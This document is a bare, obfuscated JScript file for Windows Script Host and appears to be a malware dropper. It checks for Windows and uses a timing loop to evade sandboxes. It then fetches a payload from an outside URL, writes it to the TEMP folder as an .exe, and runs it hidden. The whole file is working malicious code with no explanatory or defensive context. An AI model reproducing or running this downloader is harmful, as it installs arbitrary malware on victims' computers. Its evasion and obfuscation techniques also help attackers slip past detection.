var C = false;
var Y = "CreateObject";
var iu = function f() {return WScript[Y]("WScript.Shell");}(), S = 11;
var dp = "MSXML2.XMLHTTP";
var jG = 2123213;
var ZA = 0;
function E(p){iu["Run"](p, ZA, ZA);};
function HE(){return "" + dp;};
function b(x, IF){ZA = ZA * 1; return x - IF;};
function Za(){return Y;};
/*@cc_on
  @if (@_win32 || @_win64)
    C = true;
  @end
@*/
if (C)
{
var F = "";
function GY(){return 22;};
var h = 0; var jg = 0;
function rA()
{
var c0 = new this["Date"]();
var tc = c0["getUTCMilliseconds"]();
WScript["Sleep"](GY());
var c0 = new this["Date"]();
var V0 = c0["getUTCMilliseconds"]();
WScript["Sleep"](GY());
var c0 = new this["Date"]();
var c = c0["getUTCMilliseconds"]();
var h = "Ud";
h = b(V0, tc);
var jg = "XN";
jg = b(c, V0);
F = "open";
return b(h, jg);
}
var El = false;
var VI = false;
for (var Y0 = ZA; Y0 < GY() * 1; Y0++){if (rA() != ZA){
El = true; 
jg = "31" + 11 * h + jg; 
VI = true; 
break;
}}
function jj() {return ((El == true) && (El == VI)) ? 1 : ZA;};
if (El && jj() && VI){
function YH() {return iu["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ov7NKaRP3c.exe";};
 xn = HE();
 j = WScript[Y](xn);
 var k = 1;
 while (k){
try {
j[F]("GET", "http://greenellebox.com/a1odk", false);
j["send"]();
np = "Sleep";
for (;;){WScript[np](GY() * 11); if (j["readystate"] >= 2 * 2) break;};
k = ZA;
} catch(xv){};
}
function vu(V) {var th = (1, 2, 3, 4, 5, V); return th;};
t = WScript[Za()]("ADODB.Stream");
xn = t;
xn[F]();
xn["type"] = vu(1);
xn["write"](j["ResponseBody"]);
t["position"] = vu(ZA);
xn["Save" + "ToFile"](YH(), 2);
t["c"+"lose"]();
z = YH();
E(z);
}
}

